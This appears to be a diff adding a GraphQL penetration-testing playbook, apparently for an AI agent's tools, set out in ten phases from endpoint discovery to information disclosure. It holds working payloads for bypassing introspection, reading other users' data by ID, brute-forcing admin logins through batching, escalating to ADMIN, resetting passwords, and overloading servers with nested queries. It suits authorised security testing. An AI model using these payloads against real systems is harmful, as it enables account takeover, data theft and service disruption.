@@ -1,0 +1,179 @@
+=== GraphQL Testing -- 10 Phases ===
+
+--- TOOLS ---
+
+  graphql_introspect(endpoint, headers?, bypassTechnique?)
+    endpoint: Full URL (e.g., "https://target.com/graphql")
+    headers: Map of custom headers
+    bypassTechnique: NONE (default), NEWLINE, GET, ALIASED, FRAGMENTS
+
+  graphql_build_query(operationName, fields, arguments?, isMutation?)
+    operationName: Query/mutation name
+    fields: List of field names (supports nested: "user { id name }")
+    arguments: Map of argument name to value
+    isMutation: true for mutations
+
+  graphql_suggest_payloads(category?)
+    category: ALL, INJECTION, IDOR, AUTHORIZATION, DOS, INFO, MUTATION
+
+--- PHASE 1: ENDPOINT DISCOVERY ---
+
+  Common GraphQL paths:
+    /graphql  /graphql/console  /graphql/api  /api/graphql
+    /v1/graphql  /v2/graphql  /query  /gql
+    /graphiql  /playground  /console  /explorer  /altair
+
+  Test each with: {"query": "{ __typename }"}
+  If response contains __typename -> GraphQL endpoint found.
+
+--- PHASE 2: INTROSPECTION ---
+
+  graphql_introspect(endpoint="https://target.com/graphql")
+  -> Returns full schema: types, fields, arguments, directives
+
+  If introspection disabled, try bypasses:
+    graphql_introspect(endpoint=URL, bypassTechnique="NEWLINE")
+    graphql_introspect(endpoint=URL, bypassTechnique="GET")
+    graphql_introspect(endpoint=URL, bypassTechnique="ALIASED")
+    graphql_introspect(endpoint=URL, bypassTechnique="FRAGMENTS")
+
+  Manual bypass attempts:
+    Newline:     { __schema\n{types{name}} }
+    GET request: GET /graphql?query={__schema{types{name}}}
+    Type probe:  {__type(name:"User"){fields{name}}}
+    Comments:    {#comment\n__schema{types{name}}}
+
+--- PHASE 3: SCHEMA ANALYSIS ---
+
+  Look for sensitive types:
+    User, Account, Admin, Profile
+    Credential, Password, Secret, Token
+    Payment, Card, Transaction, Order
+    Config, Setting, Internal, Debug
+    Role, Permission, Privilege
+
+  graphql_build_query(operationName="users", fields=["id","username","email","role"])
+
+--- PHASE 4: IDOR VIA GRAPHQL ---
+
+  Test accessing other users' data by ID:
+    query { user(id: "1") { id username email ssn } }
+    query { user(id: "2") { ... } }
+
+  Relay/Node ID testing:
+    IDs are often base64: "VXNlcjox" = "User:1"
+    query { node(id: "VXNlcjox") { ... on User { id email } } }
+    Generate: echo -n "User:2" | base64 -> "VXNlcjoy"
+
+--- PHASE 5: QUERY BATCHING ---
+
+  Send multiple operations in a single request to bypass rate limits:
+
+  Array batching:
+    [
+      {"query": "mutation { login(user:\"admin\", pass:\"pass1\") { token }}"},
+      {"query": "mutation { login(user:\"admin\", pass:\"pass2\") { token }}"},
+      {"query": "mutation { login(user:\"admin\", pass:\"pass3\") { token }}"}
+    ]
+
+  If all execute -> rate limiting bypassed.
+
+--- PHASE 6: ALIAS-BASED BATCHING ---
+
+  Multiple operations using aliases in a single query:
+
+    query {
+      a0: login(username: "admin", password: "pass1") { token }
+      a1: login(username: "admin", password: "pass2") { token }
+      a2: login(username: "admin", password: "pass3") { token }
+    }
+
+  Also for user enumeration:
+    query {
+      u1: user(id: "1") { username email }
+      u2: user(id: "2") { username email }
+      u100: user(id: "100") { username email }
+    }
+
+--- PHASE 7: MUTATION ABUSE ---
+
+  Test mutations without authentication or with low-privilege token:
+
+  Self-escalation:
+    mutation { updateUser(id: "ME", input: { role: "ADMIN" }) { id role } }
+
+  Unauthorized creation:
+    mutation { createUser(input: { username: "attacker", role: "ADMIN" }) { id } }
+
+  State-changing:
+    mutation { resetPassword(userId: "VICTIM") { temporaryPassword } }
+    mutation { deleteUser(id: "TARGET") { success } }
+
+  graphql_suggest_payloads(category="MUTATION") for more ideas.
+
+--- PHASE 8: DIRECTIVE INJECTION ---
+
+  Discover custom directives:
+    { __schema { directives { name description locations args { name } } } }
+
+  @include/@skip bypass:
+    query { user(id: "1") { username password @include(if: true) ssn @include(if: true) } }
+    query { user(id: "1") { username password @skip(if: false) } }
+
+  Deprecated fields (may still work):
+    query { user(id: "1") { legacyPassword } }
+
+  Debug directives:
+    query { user(id: "1") @debug { username } }
+    query { user(id: "1") @trace { username } }
+
+--- PHASE 9: DOS & RESOURCE EXHAUSTION ---
+
+  Deeply nested queries (circular references):
+    query { user(id: "1") { friends { friends { friends { friends { username } } } } } }
+
+  Field duplication:
+    query { user(id: "1") { username username username email email email } }
+
+  Large array returns:
+    query { users(first: 10000) { edges { node { id posts(first: 1000) { edges { node { content } } } } } } }
+
+--- PHASE 10: INFORMATION DISCLOSURE ---
+
+  Intentional errors to extract info:
+    { user(id: "invalid") { username } }
+    { user(id: 999999999999999999999) { username } }
+    { user(id: "1") { nonexistent_field } }
+
+  Check error responses for: stack traces, file paths, version info, node_modules paths.
+
+  Test invalid inputs: null query, malformed JSON, missing closing braces.
+
+--- DETECTION PATTERNS ---
+
+  Success: Full schema returned, other users' data, all batch queries executed,
+           mutation succeeded without auth, nested data returned
+  Error:   "Introspection disabled", "Query depth exceeded",
+           "Query complexity exceeded", "Rate limit exceeded"
+
+--- EXTERNAL TOOLS ---
+
+  graphql-cop -- Security auditing: graphql-cop.py -t https://TARGET/graphql
+  Clairvoyance -- Schema extraction when introspection disabled
+  InQL -- Burp extension for GraphQL testing
+  GraphQL Voyager -- Schema visualization
+
+--- TESTING CHECKLIST ---
+
+  [ ] Discover GraphQL endpoint
+  [ ] Test introspection + bypasses
+  [ ] Analyze schema for sensitive types
+  [ ] Test IDOR on all ID-based queries
+  [ ] Test query batching for rate limit bypass
+  [ ] Test alias-based batching
+  [ ] Test mutations without/with low-priv auth
+  [ ] Test directive injection
+  [ ] Test deeply nested queries (DoS)
+  [ ] Analyze error messages for info disclosure
+  [ ] Test injection in query arguments (SQLi, XSS)
+  [ ] Check for debug/development endpoints
